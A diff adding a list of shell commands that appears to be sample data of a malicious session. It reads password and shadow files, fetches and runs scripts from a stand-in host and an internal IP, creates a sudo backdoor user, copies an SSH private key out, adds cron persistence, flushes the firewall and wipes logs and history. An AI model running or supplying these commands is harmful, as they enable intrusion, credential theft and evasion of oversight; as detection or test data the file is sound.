@@ -1,0 +1,27 @@
+ls
+pwd
+cd /home/shashi
+ls -la
+sudo cat /etc/passwd
+sudo cat /etc/shadow
+wget http://evil-site.com/malware.sh
+chmod +x malware.sh
+bash malware.sh
+useradd hacker
+passwd hacker
+sudo usermod -aG sudo hacker
+curl http://192.168.1.100/payload | bash
+nc -lvp 4444
+ssh-keygen -t rsa
+cat ~/.ssh/id_rsa
+scp ~/.ssh/id_rsa hacker@192.168.1.100:/tmp/
+crontab -e
+echo "* * * * * bash /tmp/malware.sh" >> /tmp/cron
+sudo iptables -F
+base64 /etc/shadow
+python3 -c "import socket; s=socket.socket()"
+perl -e "system('/bin/bash')"
+sudo userdel john
+shred -u /var/log/auth.log
+rm -rf /var/log/
+history -c
